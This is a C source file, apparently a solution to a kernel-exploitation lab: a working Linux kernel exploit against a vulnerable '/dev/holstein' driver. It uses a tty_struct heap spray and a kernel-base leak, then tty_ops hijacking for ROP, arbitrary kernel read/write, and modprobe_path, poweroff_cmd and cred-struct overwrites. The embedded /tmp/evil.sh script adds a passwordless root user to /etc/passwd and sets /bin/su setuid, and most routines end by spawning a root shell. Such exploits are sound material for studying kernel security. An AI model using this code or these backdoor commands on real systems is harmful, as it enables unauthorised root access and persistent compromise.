#include <fcntl.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <unistd.h>

typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned char u8;

#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
#define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
#define fatal(msg, ...)                                                        \
    {                                                                          \
        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
        exit(EXIT_FAILURE);                                                    \
    }
#define rebase(addr) (addr - RAW_KBASE + kbase)

#define DEVICE_NAME "/dev/holstein"
#define IOCTL_DEBUG 0x10
#define IOCTL_SET_MAX_BUFFER 0x20
#define RAW_KBASE 0xffffffff81000000

#define prepare_kernel_cred (kbase + 0x74650)
#define commit_creds (kbase + 0x744b0)
#define swapgs_restore_regs_and_return_to_usermode (kbase + 0x800e10 + 22)

/* push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret; */
#define push_rdx_pop_rsp (0xffffffff813a478a - RAW_KBASE + kbase)
#define pop_rdi (0xffffffff810d748d - RAW_KBASE + kbase)
#define mov_prdx_rcx (0xffffffff810477f7 - RAW_KBASE + kbase)
#define mov_rax_prdx (0xffffffff813a5f29 - RAW_KBASE + kbase)

#define modprobe_path (0xffffffff81e38180 - RAW_KBASE + kbase)
#define poweroff_cmd rebase(0xffffffff81e379c0)
#define poweroff_work_func rebase(0xffffffff81075380)

#define ofs_tty_ops 0xc38880

int global_fd;
int aaw_cached_fd = -1;
int aar_cached_fd = -1;

int spray[100];
char buf[0x500];
u64 g_buf;

u64 user_cs, user_rflags, user_sp, user_ss;
u64 cookie, kbase, offset;
u64 tmp_buf, cred_struct;

enum current_state {
    create_cred_struct_state,
    spawn_shell_state,
} global_cstate = create_cred_struct_state;

void _write(void *buf, size_t sz) {
    ssize_t nb = write(global_fd, buf, sz);
    if (nb < 0) {
        fatal("write failure");
    }
    /* info("Wrote 0x%zx bytes", nb); */
}

void _read(void *buf, size_t sz) {
    ssize_t nb = read(global_fd, buf, sz);
    if (nb < 0) {
        fatal("read failure");
    }
    /* info("Read 0x%zx bytes", nb); */
}

void _ioctl(u32 cmd, size_t arg) {
    ioctl(global_fd, cmd, arg);
}

void open_dev(void) {
    global_fd = open(DEVICE_NAME, O_RDWR);
    if (global_fd < 0) {
        fatal("Failed to open device: %s", DEVICE_NAME);
    }
    /* info("Device opened"); */
}

void aaw32(u64 addr, u32 val) {
    aar_cached_fd = -1;
    if (aaw_cached_fd == -1) {
        *(u64 *)&buf[0x418] = g_buf;
        u64 *ptr = (u64 *)&buf;
        ptr[0xc] = mov_prdx_rcx;
        _write(buf, 0x420);
    }
    if (aaw_cached_fd == -1) {
        for (size_t i = 0; i < 100; i++) {
            int ret = ioctl(spray[i], val, addr);
            if (ret != -1) {
                aaw_cached_fd = spray[i];
                return;
            }
        }
    } else {
        ioctl(aaw_cached_fd, val, addr);
    }
}

u32 aar32(u64 addr) {
    aaw_cached_fd = -1;
    if (aar_cached_fd == -1) {
        *(u64 *)&buf[0x418] = g_buf;
        u64 *ptr = (u64 *)&buf;
        ptr[0xc] = mov_rax_prdx;
        _write(buf, 0x420);
    }
    if (aar_cached_fd == -1) {
        for (size_t i = 0; i < 100; i++) {
            int ret = ioctl(spray[i], 0, addr);
            if (ret != -1) {
                aar_cached_fd = spray[i];
                return ret;
            }
        }
        return -1;
    }
    return ioctl(aar_cached_fd, 0, addr);
}

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        fatal("Failed to get root uid, current uid = %d", uid);
    }
    info("Spawning shell as root uid");
    system("/bin/sh");
}

void safe_exit();

void rop_privesc() {
    u64 *ptr = (u64 *)&buf;
    size_t i = 0;
    ptr[i++] = pop_rdi;
    if (global_cstate == create_cred_struct_state) {
        ptr[i++] = 0;
        ptr[i++] = prepare_kernel_cred;
    } else if (global_cstate == spawn_shell_state) {
        ptr[i++] = cred_struct;
        ptr[i++] = commit_creds;
    }
    ptr[i++] = swapgs_restore_regs_and_return_to_usermode;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = (size_t)safe_exit;
    ptr[i++] = user_cs;
    ptr[i++] = user_rflags;
    ptr[i++] = user_sp;
    ptr[i++] = user_ss;

    /* Overwrite tty_ops */
    *(u64 *)&buf[0x418] = g_buf;

    ptr[0xc] = push_rdx_pop_rsp;

    _write(buf, 0x420);
    for (size_t i = 0; i < 100; i++) {
        /* printf("[*] spraying ioctl: %03lu\r", i); */
        ioctl(spray[i], 0xdeadbeef,
              g_buf - 0x10); // 0x10 to accomodate for `pop r13; pop rbp;`
    }
    /* puts(""); */
    /* info("Done spraying"); */
}

void safe_exit(void) {
    __asm__(".intel_syntax noprefix;"
            "mov tmp_buf, rax;"
            ".att_syntax noprefix;");
    if (global_cstate == create_cred_struct_state) {
        cred_struct = tmp_buf;
        /* info("cred_struct @ 0x%zx", cred_struct); */
        global_cstate = spawn_shell_state;
        rop_privesc();
        return;
    }
    spawn_shell();
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    info("User states are saved");
}

void modprobe_path_privesc() {
    char cmd[] = "/tmp/evil.sh";
    for (size_t i = 0; i < sizeof(cmd); i += 4)
        aaw32(modprobe_path + i, *(u32 *)&cmd[i]);

    int fd = open(cmd, O_RDWR | O_CREAT);
    dprintf(fd, "%s",
            "#!/bin/sh\n"
            "echo 'pwned::0:0::/:/bin/sh' >> /etc/passwd\n"
            "chown root:root /bin/su\n"
            "chmod +s /bin/su\n");
    close(fd);
    if (chmod(cmd, 0777)) {
        fatal("chmod %s", cmd);
    }

    char trigger[] = "/tmp/x";
    fd = open(trigger, O_RDWR | O_CREAT);
    dprintf(fd, "%s", "\xff\xff\xff\xff");
    close(fd);
    if (chmod(trigger, 0777)) {
        fatal("chmod %s", cmd);
    }
    system(trigger);
    return;
}

void overwrite_poweroff_cmd_privesc() {
    char cmd[] = "/tmp/evil.sh";
    for (size_t i = 0; i < sizeof(cmd); i += 4)
        aaw32(poweroff_cmd + i, *(u32 *)&cmd[i]);

    int fd = open(cmd, O_RDWR | O_CREAT);
    dprintf(fd, "%s",
            "#!/bin/sh\n"
            "echo 'pwned::0:0::/:/bin/sh' >> /etc/passwd\n"
            "chown root:root /bin/su\n"
            "chmod +s /bin/su\n");
    close(fd);
    if (chmod(cmd, 0777)) {
        fatal("chmod %s", cmd);
    }
    *(u64 *)&buf[0x418] = g_buf;
    u64 *ptr = (u64 *)&buf;
    ptr[0xc] = poweroff_work_func;
    _write(buf, 0x420);
    for (size_t i = 0; i < 100; i++) {
        ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
    }
}

void overwrite_cred_struct_privesc() {
    char name[] = "d0ublew";
    if (prctl(PR_SET_NAME, name) == -1) {
        fatal("prctl PR_SET_NAME");
    }
    u64 comm_addr;
    u8 found = 0;
    for (comm_addr = g_buf - 0x1000000;; comm_addr += 0x8) {
        if ((comm_addr & 0xfffff) == 0)
            progress("Searching... 0x%016llx", comm_addr);

        if (aar32(comm_addr) == *(u32 *)&name[0] &&
            aar32(comm_addr + 4) == *(u32 *)&name[4]) {
            found = 1;
            info("Found 'comm' @ 0x%016llx", comm_addr);
            break;
        }
    }
    if (!found) {
        fatal("Unable to locate 'comm'");
    }
    u64 cred_addr = 0;
    cred_addr |= aar32(comm_addr - 8);
    cred_addr |= (u64)aar32(comm_addr - 4) << 32;
    info("current->cred = 0x%016llx", cred_addr);
    for (u64 i = 1; i < 9; i++) {
        aaw32(cred_addr + i * 4, 0);
    }
    info("pwned!");
    system("/bin/sh");
}

int main(void) {
    save_user_state();
    setbuf(stdout, 0);

    /* Heap spraying */
    for (size_t i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] < 0)
            fatal("/dev/ptmx");
    }

    open_dev();

    for (size_t i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] < 0)
            fatal("/dev/ptmx");
    }

    _read(buf, sizeof(buf));
    kbase = *(u64 *)&buf[0x418] - ofs_tty_ops;
    info("kbase = 0x%016llx", kbase);

    g_buf = *(u64 *)&buf[0x438] - 0x438;
    info("g_buf = 0x%016llx", g_buf);

    /* u64 *ptr = (u64 *)&buf; */
    /* for (size_t i = 0; i < 0x40; i++) { */
    /*     ptr[i] = 0xffffffffdead0000 + (i << 8); */
    /* } */
    /* *(u64 *)&buf[0x418] = g_buf; */
    /* _write(buf, 0x420); */
    /*
     * RIP: 0010:0xffffffffdead0c00
     * Code: Unable to access opcode bytes at RIP 0xffffffffdead0bd6.
     * RSP: 0018:ffffc90000187e10 EFLAGS: 00000286
     * RAX: ffffffffdead0c00 RBX: ffff8880030f9c00 RCX: 00000000deadbeef
     * RDX: 00000000cafebabe RSI: 00000000deadbeef RDI: ffff8880030f9800
     * RBP: ffffc90000187ea8 R08: 00000000cafebabe R09: 0000000000000000
     * R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
     * R13: ffff8880030f9800 R14: 00000000cafebabe R15: ffff888002e44500
     *
     * From ioctl spraying, we crash @ 0xffffffffdead0c00
     * our arguments also end up on various registers
     */
    /* for (size_t i = 0; i < 100; i++) { */
    /*     ioctl(spray[i], 0xdeadbeef, 0xcafebabe12345678); */
    /* } */

    /* rop_privesc(); */
    /* modprobe_path_privesc(); */
    /* overwrite_cred_struct_privesc(); */
    overwrite_poweroff_cmd_privesc();

    close(global_fd);
    return 0;
}
